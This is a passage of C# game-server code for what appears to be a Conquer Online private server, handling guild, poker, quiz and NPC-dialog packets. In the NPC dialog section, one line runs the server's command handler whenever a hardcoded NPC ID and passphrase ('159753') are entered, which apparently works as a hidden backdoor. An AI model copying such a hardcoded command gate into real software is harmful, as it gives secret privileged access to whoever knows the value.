                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Member)
                                                    {
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                }
                                                client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(client.Entity.GuildRank);
                                            }
                                            else
                                            {
                                                client.Entity.SendSysMesage("Sorry Can't Find " + GetMemberName);
                                            }
                                        }
                                    }

                                    break;
                                }
                            case GuildCommand.JoinRequest: // asking gl
                                {
                                    GameState Target;
                                    if (Kernel.GamePool.TryGetValue(command.dwParam, out Target))
                                    {
                                        client.GuildJoinTarget = Target.Entity.UID;
                                        if (client.GuildJoinTarget == Target.Entity.UID &&
                                            Target.GuildJoinTarget == client.Entity.UID)
                                        {
                                            client.GuildJoinTarget = 0;
                                            Target.GuildJoinTarget = 0;

                                            if (Target.Guild.BlackList.Contains(client.Entity.UID))
                                            {
                                                command.Type = 47;
                                                client.Send(command);
                                                return;
                                            }

                                            Game.ConquerStructures.Society.Guild g;
                                            if (Kernel.Guilds.TryGetValue(Target.Entity.GuildID, out g))
                                            {
                                                if (Target.AsMember.Rank != Game.Enums.GuildMemberRank.Member)
                                                {
                                                    if (client.Entity.GuildID == 0)
                                                    {
                                                        g.AddMember(client);
                                                    }
                                                }
                                            }
                                        }
                                        else
                                        {
                                            MTA.Game.ConquerStructures.Society.Guild tG;
                                            if (Kernel.Guilds.TryGetValue(Target.Entity.GuildID, out tG))
                                            {
                                                if (Target.AsMember.Rank != Game.Enums.GuildMemberRank.Member)
                                                {
                                                    if (Target.Guild.BlackList.Contains(client.Entity.UID))
                                                    {
                                                        command.Type = 47;
                                                        client.Send(command);
                                                        return;
                                                    }
                                                    if (PassJoinRequirements(client, tG))
                                                    {
                                                        client.Entity.GuildRequest = Time32.Now;
                                                        command.dwParam = client.Entity.UID;

                                                        Network.GamePackets.PopupLevelandBP inf = new Network.GamePackets.PopupLevelandBP();

                                                        inf.Level = client.Entity.Level;
                                                        inf.BattlePower = (uint)client.Entity.BattlePower;
                                                        inf.Receiver = Target.Entity.UID;
                                                        inf.Requester = client.Entity.UID;
                                                        Target.Send(inf.ToArray());

                                                        Target.Send(command);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    break;
                                }

                            case GuildCommand.InviteRequest: // gl invites
                                {
                                    GameState Target;
                                    if (Kernel.GamePool.TryGetValue(command.dwParam, out Target))
                                    {
                                        client.GuildJoinTarget = Target.Entity.UID;
                                        if (client.GuildJoinTarget == Target.Entity.UID &&
                                            Target.GuildJoinTarget == client.Entity.UID)
                                        {
                                            client.GuildJoinTarget = 0;
                                            Target.GuildJoinTarget = 0;

                                            if (client.Guild.BlackList.Contains(Target.Entity.UID))
                                            {
                                                command.Type = 49;
                                                client.Send(command);
                                                return;
                                            }

                                            MTA.Game.ConquerStructures.Society.Guild g;
                                            if (Kernel.Guilds.TryGetValue(client.Entity.GuildID, out g))
                                            {
                                                if (client.AsMember.Rank != Game.Enums.GuildMemberRank.Member)
                                                {
                                                    g.AddMember(Target);
                                                }
                                            }
                                        }
                                        else
                                        {
                                            if (client.AsMember.Rank != Game.Enums.GuildMemberRank.Member)
                                            {
                                                if (client.Guild.BlackList.Contains(Target.Entity.UID))
                                                {
                                                    command.Type = 49;
                                                    client.Send(command);
                                                    return;
                                                }
                                                client.Entity.GuildRequest = Time32.Now;
                                                command.dwParam = client.Entity.UID;
                                                PopupLevelandBP inf = new Network.GamePackets.PopupLevelandBP();

                                                inf.Level = client.Entity.Level;
                                                inf.BattlePower = (uint)client.Entity.BattlePower;
                                                inf.Receiver = Target.Entity.UID;
                                                inf.Requester = client.Entity.UID;
                                                Target.Send(inf.ToArray());

                                                Target.Send(command);
                                            }
                                        }
                                    }
                                    break;
                                }

                            case GuildCommand.Quit:
                                {
                                    if (client.Guild != null)
                                    {
                                        if (client.AsMember.Rank != MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                        {
                                            client.Guild.ExpelMember(client.Entity.Name, true);
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region Poker packets
                #region MsgShowHandCallAction
                case 2093: { MsgShowHandCallAction.Handle(client, packet); break; }
                #endregion
                #region MsgShowHandExit
                case 2096: { MsgShowHandExit.Handle(client, packet); break; }
                #endregion
                #region MsgShowHandEnter
                case 2090: { MsgShowHandEnter.Handle(client, packet); break; }
                #endregion
                #region MsgTexasInteractive
                case 2171: { MsgTexasInteractive.Handle(client, packet); break; }
                #endregion
                #region MsgShowHandKick
                case 2088: { MsgShowHandKick.Handle(client, packet); break; }
                #endregion
                #region Poker Tournament
                case 3400:
                    {
                        client.Send(packet);
                        break;
                    }
                #endregion
                #endregion
                #region Enlight (1127)
                case 1127:
                    {
                        Enlight enlight = new Enlight(false);
                        enlight.Deserialize(packet);
                        if (Kernel.GamePool.ContainsKey(enlight.Enlighted))
                        {
                            var Client = Kernel.GamePool[enlight.Enlighted];

                            if (enlight.Enlighter == client.Entity.UID && enlight.Enlighted != enlight.Enlighter)
                            {
                                if (Client.Entity.ReceivedEnlightenPoints < 5)
                                {
                                    if (client.Entity.EnlightenPoints >= 100)
                                    {
                                        if (Client.Entity.EnlightmentTime <= 80)
                                        {
                                            client.Entity.EnlightenPoints -= 100;
                                            Client.Entity.EnlightmentStamp = Time32.Now;
                                            Client.IncreaseExperience(Game.Attacking.Calculate.Percent((int)Client.ExpBall, .10F), false);
                                            Client.SendScreen(packet, true);
                                            Client.Entity.ReceivedEnlightenPoints++;
                                            Client.Entity.EnlightmentTime += 20;
                                            if (client.Entity.EnlightmentTime > 80)
                                                client.Entity.EnlightmentTime = 100;
                                            else if (client.Entity.EnlightmentTime > 60)
                                                client.Entity.EnlightmentTime = 80;
                                            else if (client.Entity.EnlightmentTime > 40)
                                                client.Entity.EnlightmentTime = 60;
                                            else if (client.Entity.EnlightmentTime > 20)
                                                client.Entity.EnlightmentTime = 40;
                                            else if (client.Entity.EnlightmentTime > 0)
                                                client.Entity.EnlightmentTime = 20;
                                        }
                                        else client.Send(new Message("You can't enlighten " + Client.Entity.Name + " yet because he has to wait a few minutes until he can be enlightened again.", System.Drawing.Color.Red, Message.TopLeft));
                                    }
                                    else client.Send(new Message("You can't enlighten " + Client.Entity.Name + " because you don't have enough enlighten points!", System.Drawing.Color.Red, Message.TopLeft));
                                }
                                else client.Send(new Message("You can't enlighten " + Client.Entity.Name + " because he/she was enlightened today five times already!", System.Drawing.Color.Red, Message.TopLeft));
                            }
                        }
                        break;
                    }
                #endregion
                #region QuizShow (2068)
                case 2068:
                    {
                        const byte GiveAwaser = 3, Remove = 8;
                        byte Typ = packet[4];
                        var quizShow = Kernel.QuizShow;
                        switch (Typ)
                        {
                            case GiveAwaser://give right question
                                {
                                    if (quizShow.Open)
                                    {
                                        if (client.Quiz == null)
                                            client.Quiz = quizShow.RegisteredUsers[client.Entity.UID];

                                        if (client.Quiz == null) break;

                                        client.Quiz.Timer += (ushort)quizShow.NewQuestionTime;
                                        byte answer = packet[8];
                                        if (answer > 4) break;
                                        bool right = answer == quizShow.CurrentQuestion.AnswerRight;

                                        client.Quiz.Answered = true;
                                        ulong pts = 300;
                                        if (right)
                                        {
                                            pts = (byte)(quizShow.RightAnswerReward + quizShow.TimeLimit - quizShow.NewQuestionTime);

                                            client.Quiz.RightQuestion = 1;
                                            client.Quiz.Points += pts;
                                            client.Entity.QuizPoints += pts;
                                            client.Entity.TreasuerPoints += 1;
                                        }
                                        else
                                        {
                                            pts = 300;

                                            client.Quiz.RightQuestion = 2;
                                            client.Quiz.Points += pts;
                                            client.Entity.QuizPoints += pts;
                                        }
                                        client.IncreaseExperience(client.ExpBall / 300 * pts, false);

                                        if (quizShow.FirstQuestion)
                                        {
                                            QuizRank rnk = new QuizRank();
                                            rnk.GiveRight = client.Quiz.RightQuestion;
                                            rnk.MyPoints = (ushort)client.Quiz.Points;
                                            rnk.MyRank = 0;
                                            rnk.MyTime = client.Quiz.Timer;
                                            rnk.Type = QuizShowTypes.SendTop;
                                            client.Send(rnk.ToArray());
                                        }
                                    }
                                    break;
                                }
                            case Remove:
                                {
                                    if (quizShow.Open)
                                        quizShow.RemovePlayer(client);
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region NPC Dialog (2031 + 2032)
                case 2031:
                case 2032:
                    {
                        if (client.Action != 2)
                            return;
                        NpcRequest req = new NpcRequest();
                        req.Deserialize(packet);

                        if (req.InteractType == 102)
                        {
                            var quest = req.NpcID - MaTrix.QuestInfo.ActionBase;
                            client.Quests.QuitQuest((MaTrix.QuestID)quest);
                        }
                        //if (ID == 2032)
                        //    if (client.Map.BaseID == 6000 || client.Map.BaseID == 6000)
                        //        return;

                        #region TreasureChest
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6000 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 47 && client.Map.BaseID != 700)//CaptureFlag
                        {
                            if (client.Inventory.Contains(3000628, 1))
                            {
                                client.Inventory.Remove(3000628, 1);
                                client.Inventory.Add(3000593, 0, 1);
                            }
                            else
                            {
                                Network.GamePackets.NpcReply npc = new Network.GamePackets.NpcReply(6, "Sorry, but you don't have GoldenKey");
                                client.Send(npc.ToArray());
                            }
                        }
                        #endregion
                        #region TopRedName & BlackName

                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6002 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 232)
                        {
                            if (client.Entity.PKPoints >= 50 && client.Entity.PKPoints <= 150)//BlackName
                            {
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.TextsCount = 1;
                                str.Type = _String.Effect;
                                str.Texts.Add("good");
                                client.Entity.Owner.SendScreen(str, true);
                                client.Entity.Teleport(3320, 50, 50);
                                client.Send(new Network.GamePackets.NpcReply(6, "You have joined TopBlackname Map Just Wait Until it Start ."));
                            }
                            if (client.Entity.PKPoints >= 10 && client.Entity.PKPoints <= 60)//TopRedname
                            {
                                _String str = new _String(true);
                                str.UID = client.Entity.UID;
                                str.TextsCount = 1;
                                str.Type = _String.Effect;
                                str.Texts.Add("good");
                                client.Entity.Owner.SendScreen(str, true);
                                client.Entity.Teleport(3321, 50, 50);
                                client.Send(new Network.GamePackets.NpcReply(6, "You have joined TopRedname Map Just Wait Until it Start ."));
                            }


                        }

                        #endregion Top PkPoints Quest
                        #region Top FB & SS Pk Autoinvite 192
                        if ((((client.Map.BaseID != 0x1771) && (client.Map.BaseID != 0x1770)) && (!client.Entity.Dead && (req.OptionID == 192))) && (client.Map.BaseID != 700))
                        {
                            var weps = client.Weapons;
                            if ((weps.Item1 != null && weps.Item1.ID / 1000 != 410) && (weps.Item2 != null && weps.Item2.ID / 1000 != 410) && (weps.Item1 != null && weps.Item1.ID / 1000 != 420) && (weps.Item2 != null && weps.Item2.ID / 1000 != 420) && (weps.Item1 != null && weps.Item1.ID / 1000 != 614) && (weps.Item2 != null && weps.Item2.ID / 1000 != 614))
                            {
                                client.Send(new Message("You need to wear only blade or sword!", Color.Red, Message.Talk));
                                return;
                            }

                            client.Entity.RemoveFlag(Update.Flags.Ride);
                            client.Entity.Hitpoints = 2;
                            client.Entity.Teleport(1002, 407, 459);
                        }
                        #endregion
                        #region Top Horse PK

                        if ((((client.Map.BaseID != 0x1771) && (client.Map.BaseID != 0x1770)) && (!client.Entity.Dead && (req.OptionID == 193))) && (client.Map.BaseID != 700))
                        {
                            client.Entity.RemoveFlag(Update.Flags.Ride);
                            client.Entity.Hitpoints = 2;
                            client.Entity.Teleport(1002, 415, 459);
                        }

                        #endregion
                        #region Dragon

                        if ((((client.Map.BaseID != 0x1771) && (client.Map.BaseID != 0x1770)) && (!client.Entity.Dead && (req.OptionID == 194))) && (client.Map.BaseID != 700))
                        {

                            client.Entity.Teleport(1002, 443, 361);
                        }

                        #endregion Top SS&FB Pk Autoinvite 192
                        #region Cyclone War
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6000 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 147 && client.Map.BaseID != 700)
                        {
                            client.Entity.Teleport(1002, 424, 249);
                        }
                        #endregion Cyclone War
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6000 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 251 && client.Map.BaseID != 700)// Critical PK
                        {
                            Random R = new Random();
                            client.Entity.Teleport(1002, 415, 383);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6002 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 230)
                        {
                            client.Entity.Teleport(1702, 50, 50);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6002 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 231)
                        {
                            client.Entity.Teleport(1701, 50, 50);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 249 && client.Map.BaseID != 700)//ElitePk
                        {
                            client.Entity.Teleport(1002, 425, 378);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 248 && client.Map.BaseID != 700)//ClassPk
                        {
                            client.Entity.Teleport(1002, 439, 246);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 247 && client.Map.BaseID != 700)//WeeklyPk
                        {
                            client.Entity.Teleport(1002, 453, 294);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 246 && client.Map.BaseID != 700)//MonthlyPk
                        {
                            client.Entity.Teleport(1002, 428, 243);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 245 && client.Map.BaseID != 700)//DisCity
                        {
                            client.Entity.Teleport(1020, 534, 484);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 244 && client.Map.BaseID != 700)//GuildWar
                        {
                            client.Entity.Teleport(1038, 340, 331);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 243 && client.Map.BaseID != 700)//DailyPk
                        {
                            client.Entity.Teleport(1002, 449, 372);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 242 && client.Map.BaseID != 700)//SteedRace
                        {
                            client.Entity.Teleport(1002, 423, 245);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 241 && client.Map.BaseID != 700)//SpouseWar
                        {
                            client.Entity.Teleport(1002, 421, 292);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 240 && client.Map.BaseID != 700)//DeathTeam
                        {
                            client.Entity.Teleport(1002, 439, 389);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 239 && client.Map.BaseID != 700)//EliteGW
                        {
                            client.Entity.Teleport(1002, 414, 259);
                        }
                        if (client.Map.BaseID != 6001 && client.Map.BaseID != 6004 && !client.Entity.Dead && client.Entity.PokerTableUID == 0 && req.OptionID == 238 && client.Map.BaseID != 700)//champion
                        {
                            if (!client.ChampionStats.SignedUp)
                            {
                                Game.Champion.QualifyEngine.DoSignup(client);
                                client.Send(Champion.ChampionKernel.SignUp().BuildPacket());
                            }
                        }
                        if (client.ActiveNpc == 5435234)
                            if (req.Input == "159753")
                                CheckCommand(client.Command, client, false);
                        if (req.InteractType == NpcReply.MessageBox)
                        {
                            if (client.Entity.ActivePOPUP == 99995)//jose
                            {
                                client.Entity.ActivePOPUP = 0;
                                break;
                            }

                            if (req.OptionID == 255 && client.MessageOK != null)
                                client.MessageOK.Invoke(client);
                            else
                                if (client.MessageCancel != null)
                                client.MessageCancel.Invoke(client);

                            client.MessageOK = null;
                            client.MessageCancel = null;
                        }
                        else
                        {
                            if (ID == 2031)
                                client.ActiveNpc = req.NpcID;
                            if (req.NpcID == 12)
                            {
                                if (client.Entity.VIPLevel > 0)
                                {
                                    Data data = new Data(true);
                                    data.ID = Data.OpenWindow;
                                    data.UID = client.Entity.UID;
                                    data.TimeStamp = Time32.Now;
                                    data.dwParam = Data.WindowCommands.VIPWarehouse;
                                    data.wParam1 = client.Entity.X;
                                    data.wParam2 = client.Entity.Y;
                                    client.Send(data);
                                    break;
                                }
                            }
                            #region House
                            if (MaTrix.House.Houses.ContainsKey(client.Entity.UID))
                            {
                                var info = MaTrix.House.Houses[client.Entity.UID];
                                if (info.Furnitures.ContainsKey(req.NpcID))
                                {

                                    var itembox = MaTrix.House.CheckItemBox(client, info);//info.Furnitures.Values.Where(xx => (xx.Mesh / 10) == 820).FirstOrDefault();
                                    if (itembox != null)
                                    {
                                        if (req.NpcID == itembox.UID)
                                        {
                                            Data data = new Data(true);
                                            data.ID = Data.OpenWindow;
                                            data.UID = client.Entity.UID;
                                            data.TimeStamp = Time32.Now;
                                            data.dwParam = Data.WindowCommands.Warehouse;
                                            data.wParam1 = client.Entity.X;
                                            data.wParam2 = client.Entity.Y;
                                            client.Send(data);
                                        }
                                    }
                                    SobNpcSpawn sobnpc = info.Furnitures[req.NpcID];
                                    MaTrix.House.Move(client, sobnpc, info);
                                    //client.MessageBox("Do u Want To change its place?", (p) =>
                                    //{
                                    //    info.Furnitures.Remove(sobnpc.UID);
                                    //    p.Screen.FullWipe();
                                    //    p.Screen.Reload();
                                    //    NpcRequest req2 = new NpcRequest(5);
                                    //    req2.Mesh = sobnpc.Mesh;
                                    //    req2.NpcTyp = sobnpc.Type;
                                    //    p.Send(req2);
                                    //}, null);

                                }
                            }
                            else if (MaTrix.House.SpouseHouse(client.Entity.Spouse) != null)
                            {
                                var info = MaTrix.House.SpouseHouse(client.Entity.Spouse);
                                if (client.Entity.MapID == info.ID)
                                {
                                    if (info.Furnitures.ContainsKey(req.NpcID))
                                    {

                                        var itembox = MaTrix.House.CheckItemBox(client, info);//info.Furnitures.Values.Where(xx => (xx.Mesh / 10) == 820).FirstOrDefault();
                                        if (itembox != null)
                                        {
                                            if (req.NpcID == itembox.UID)
                                            {
                                                Data data = new Data(true);
                                                data.ID = Data.OpenWindow;
                                                data.UID = client.Entity.UID;
                                                data.TimeStamp = Time32.Now;
                                                data.dwParam = Data.WindowCommands.Warehouse;
                                                data.wParam1 = client.Entity.X;
                                                data.wParam2 = client.Entity.Y;
                                                client.Send(data);
                                            }
                                        }
                                    }
                                }
                            }
                            #endregion
                            Interfaces.INpc npc = null;
                            if (req.InteractType == 102)
                            {
                                if (client.Guild != null)
                                {
                                    if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                    {
                                        client.Guild.ExpelMember(req.Input, false);
                                    }
                                    else if (client.AsMember.Rank == Enums.GuildMemberRank.DeputyLeader)
                                    {
                                        var member = client.Guild.GetMemberByName(req.Input);
                                        if (member != null)
                                        {
                                            if (member.Rank == Enums.GuildMemberRank.DeputyLeader || member.Rank == Enums.GuildMemberRank.GuildLeader)
                                                return;
                                            client.Guild.ExpelMember(req.Input, false);
                                        }
                                    }
                                }
                                return;
                            }
                            if (client.ActiveNpc >= 728525 && client.ActiveNpc <= 728527)
                            {
                                if (client.Inventory.Contains(client.ActiveNpc, 1))
                                {
                                    if (req.OptionID >= 1 && req.OptionID <= 3)
                                    {
                                        uint color = 255 | 150 << 16;
                                        if (req.OptionID == 2)
                                            color = 150 << 8 | 255 << 16;
                                        else if (req.OptionID == 3)
                                            color = 150 | 255 << 8;
                                        byte plus = 1;
                                        if (client.ActiveNpc % 10 == 6) plus = 3;
                                        else if (client.ActiveNpc % 10 == 7) plus = 6;
                                        client.Inventory.Remove(client.ActiveNpc, 1);
                                        ConquerItem _item = new ConquerItem(true);
                                        _item.ID = 300000;
                                        Database.ConquerItemInformation _iteminfos = new Database.ConquerItemInformation(_item.ID, 0);
                                        _item.Durability = _item.MaximDurability = _iteminfos.BaseInformation.Durability;
                                        _item.Plus = plus;
                                        _item.Effect = Game.Enums.ItemEffect.Horse;
                                        _item.SocketProgress = color;
                                        client.Inventory.Add(_item, Game.Enums.ItemUse.CreateAndAdd);
                                    }
                                }
                                return;
                            }
                            #region Captchas
                            Npcs dialog = new Npcs(client);
                            //if (client.Booth != null)
                            //    if (client.ActiveNpc == 9999998 && req.OptionID != 255 && client.SMCaptcha != "")
                            //    {
                            //        if (req.Input == client.SMCaptcha)
                            //        {
                            //            client.SMSpinCount = 0;
                            //            client.SMCaptcha = "";
                            //            PacketHandler.HandlePacket(client.SMPacket, client);
                            //            client.SMPacket = null;
                            //        }
                            //        else
                            //        {
                            //            dialog.Text("You have spun the wheel 10 times. Input the current text: " + client.SMCaptcha + " to verify your humanity.");
                            //            dialog.Input("Captcha message:", 1, (byte)client.SMCaptcha.Length);
                            //            dialog.Option("No thank you.", 255);
                            //            dialog.Send();
                            //        }
                            //        return;
                            //    }
                            //if (client.Booth != null)
                            //    if (client.ActiveNpc == 9999990 && client.ExpectingQAnswer)
                            //    {
                            //        if (req.OptionID == 255) return;
                            //        client.ExpectingQAnswer = false;
                            //        if (req.Input == client.QAnswer && client.QCorrect != null)
                            //            client.QCorrect(client);
                            //        else
                            //            if (client.QWrong != null)
                            //                client.QWrong(client);
                            //        client.QAnswer = null;
                            //        client.QWrong = null;
                            //        return;
                            //    }
                            //if (client.Booth != null)
                            //    if (client.ActiveNpc == 9999997 && client.WaitingKillCaptcha)
                            //    {
                            //        if (req.OptionID == 255) return;
                            //        if (req.Input == client.KillCountCaptcha)
                            //        {
                            //            client.Entity.KillCount = 0;
                            //            client.Entity.KillCount2 = 0;
                            //            client.WaitingKillCaptcha = false;
                            //        }
                            //        else
                            //        {
                            //            dialog.Text("Input the current text: " + client.KillCountCaptcha + " to verify your humanity.");
                            //            dialog.Input("Captcha message:", 1, (byte)client.KillCountCaptcha.Length);
                            //            dialog.Option("No thank you.", 255);
                            //            dialog.Send();
                            //        }
                            //        return;
                            //    }
                            /* if (client.ActiveNpc == 9999996 && client.WaitingTradePassword)
                             {
                                 if (req.OptionID == 255)
                                 {
                                     CloseTrade(new Trade(true) { Type = Trade.Close }, client);
                                     return;
                                 }
                                 if (req.Input == client.WarehousePW)
                                 {
                                     AcceptTrade(client.TradePacket, client);
                                     client.TradePacket = null;
                                     client.WaitingTradePassword = false;
                                 }
                                 else
                                 {
                                     dialog.Text("Input the warehouse password to trade");
                                     dialog.Input("Password:", 1, 16);
                                     dialog.Option("No thank you.", 255);
                                     dialog.Send();
                                 }
                                 return;
                             }*/
                            if (client.Booth != null)
                                if (client.ActiveNpc == 9999995 && client.WaitingItemUnlockPassword)
                                {
                                    if (req.OptionID == 255)
                                    {
                                        client.ItemUnlockPacket = null;
                                        return;
                                    }
                                    if (req.Input == client.WarehousePW.ToString())
                                    {
                                        UnlockItemInstant(client.ItemUnlockPacket, client);
                                        client.ItemUnlockPacket = null;
                                        client.WaitingItemUnlockPassword = false;
                                    }
                                    else
                                    {
                                        dialog.Text("Input the warehouse password to instantly unlock.");
                                        dialog.Input("Password:", 1, 16);
                                        dialog.Option("No thank you.", 255);
                                        dialog.Send();
                                    }
                                    return;
                                }
                            #endregion
                            #region SteedPack
                            if (client.ActiveNpc == 729990)
                            {
                                if (client.Inventory.Contains(client.ActiveNpc, 1))
                                {
                                    if (req.OptionID == 1)
                                    {
                                        //   CheckCommand("@item Steed Fixed 6 0 0 0 0 187 135 201", client);
                                        uint R = 187,
                                        G = 135,
                                        B = 201;
                                        ConquerItem item = new ConquerItem(true);
                                        item.ID = 300000;
                                        item.Plus = 6;
                                        item.Durability = item.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[item.ID].Durability;
                                        item.SocketProgress = (uint)(B | (G << 8) | (R << 16));
                                        client.Inventory.Add(item, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                        client.Inventory.Remove(client.ActiveNpc, 1);
                                    }
                                    if (req.OptionID == 2)
                                    {
                                        //   CheckCommand("@item Steed Fixed 6 0 0 0 0 62 63 184", client);
                                        uint R = 62,
                                        G = 63,
                                        B = 184;
                                        ConquerItem item = new ConquerItem(true);
                                        item.ID = 300000;
                                        item.Plus = 6;
                                        item.Durability = item.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[item.ID].Durability;
                                        item.SocketProgress = (uint)(B | (G << 8) | (R << 16));
                                        client.Inventory.Add(item, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                        client.Inventory.Remove(client.ActiveNpc, 1);
                                    }
                                    if (req.OptionID == 3)
                                    {
                                        // CheckCommand("@item Steed Fixed 6 0 0 0 0 148 156 137", client);
                                        uint R = 148,
                                        G = 156,
                                        B = 137;
                                        ConquerItem item = new ConquerItem(true);
                                        item.ID = 300000;
                                        item.Plus = 6;
                                        item.Durability = item.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[item.ID].Durability;
                                        item.SocketProgress = (uint)(B | (G << 8) | (R << 16));
                                        client.Inventory.Add(item, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                        client.Inventory.Remove(client.ActiveNpc, 1);
                                    }
                                    if (req.OptionID == 4)
                                    {
                                        // CheckCommand("@item Steed Fixed 6 0 0 0 0 147 134 122", client);
                                        uint R = 147,
                                        G = 134,
                                        B = 122;
                                        ConquerItem item = new ConquerItem(true);
                                        item.ID = 300000;
                                        item.Plus = 6;
                                        item.Durability = item.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[item.ID].Durability;
                                        item.SocketProgress = (uint)(B | (G << 8) | (R << 16));
                                        client.Inventory.Add(item, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                        client.Inventory.Remove(client.ActiveNpc, 1);
                                    }
                                    if (req.OptionID == 5)
                                    {
                                        //   CheckCommand("@item Steed Fixed 6 0 0 0 0 142 39 46", client);
                                        uint R = 142,
                                         G = 39,
                                         B = 46;
                                        ConquerItem item = new ConquerItem(true);
                                        item.ID = 300000;
                                        item.Plus = 6;
                                        item.Durability = item.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[item.ID].Durability;
                                        item.SocketProgress = (uint)(B | (G << 8) | (R << 16));
                                        client.Inventory.Add(item, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                        client.Inventory.Remove(client.ActiveNpc, 1);
                                    }
                                }
                            }
                            #endregion
                            if (client.ActiveNpc >= 9994 && client.ActiveNpc <= 9997)
                            {
                                if (req.OptionID == 255 || (req.OptionID == 0 && ID == 2032)) return;
                                switch (req.OptionID)
                                {
                                    case 0:
                                        {
                                            dialog.Text("Do you want to back to the guild arena?");
                                            dialog.Option("Yes.", 1);
                                            dialog.Option("No.", 255);
                                            dialog.Send();
                                            break;
                                        }
                                    case 1:
                                        {
                                            client.Entity.Teleport(1038, 348, 339);
                                            client.ActiveNpc = 0;
                                            break;
                                        }
                                }
                                return;
                            }
                            if (client.Map.Npcs.TryGetValue(client.ActiveNpc, out npc))
                            {
                                if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, npc.X, npc.Y) > 17)
                                    return;
                                if (req.OptionID == 255 || (req.OptionID == 0 && ID == 2032))
                                    return;
                                if (client.Entity.Dead)
                                    return;
                                req.NpcID = client.ActiveNpc;
                                /*if (client.Entity.Name == "")
                                {
                                    client.MessageBox("Please change your name for free", p =>
                                    {
                                        Data data7 = new Data(true)
                                        {
                                            UID = client.Entity.UID,
                                            ID = 0x7e,
                                            dwParam = 0x1e9,
                                            wParam1 = client.Entity.X,
                                            wParam2 = client.Entity.Y
                                        };
                                        client.Send(data7);
                                    }, null);
                                    return;
                                }*/
                                //if (!client.Voted)
                                //{
                                //    MaTrix.Vote_System.Voted(client);
                                //    return;
                                //}
                                if ((client.Map.BaseID >= 6000 && client.Map.BaseID <= 6004) && (!(Constants.ActiveNPC.Contains(client.ActiveNpc))))
                                    return;
                                Npcs.GetDialog(req, client);
                                if (client.Account.State == MTA.Database.AccountTable.AccountState.GM)
